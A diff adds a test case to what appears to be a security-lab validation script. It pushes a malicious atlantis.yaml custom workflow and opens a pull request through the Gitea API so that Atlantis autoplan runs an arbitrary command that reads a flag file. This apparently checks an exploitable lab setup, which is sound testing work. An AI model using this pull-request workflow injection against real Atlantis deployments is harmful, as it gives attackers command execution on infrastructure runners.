@@ -457,6 +457,37 @@ EOF
   else no pbac_2 "no leaked token on runner"; fi
 fi
 
+# --- tf_2: a PR's atlantis.yaml custom workflow runs arbitrary commands at plan time ----
+if enabled tf_2; then
+  on atlantis 'rm -f /tmp/tf2-proof' >/dev/null 2>&1
+  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
+  ( cd "$W/infra"; git -c user.email=atk@x -c user.name=atk checkout -q -B atlantis-pwn 2>/dev/null
+    cat > atlantis.yaml <<'YML'
+version: 3
+projects:
+  - dir: .
+    workflow: pwn
+workflows:
+  pwn:
+    plan:
+      steps:
+        - run: cat /opt/minilab2/tf2-flag.txt > /tmp/tf2-proof
+        - init
+        - plan
+YML
+    echo "# trigger $(date +%s)" >> main.tf
+    git -c user.email=atk@x -c user.name=atk add -A
+    git -c user.email=atk@x -c user.name=atk commit -q -m "add atlantis config"
+    git -c user.email=atk@x -c user.name=atk push -q -f origin atlantis-pwn ) 2>/dev/null
+  rm -rf "$W"
+  # open a PR -> gitea webhook -> atlantis autoplan -> custom run: fires
+  curl -s -u "$AU:$AP" -H 'Content-Type: application/json' -X POST \
+    "http://gitea:3000/api/v1/repos/alpha/infra/pulls" \
+    -d '{"title":"infra change","head":"atlantis-pwn","base":"main"}' >/dev/null 2>&1
+  out=$(on atlantis 'for i in $(seq 1 50); do [ -s /tmp/tf2-proof ] && break; sleep 3; done; cat /tmp/tf2-proof 2>/dev/null')
+  chk tf_2 tf_2-atlantis-custom-workflow "$out"
+fi
+
 echo "### Policy-as-code bypass ###"
 
 # --- pol_1: conftest coverage gap -> malicious (uncovered) resource passes the gate ----
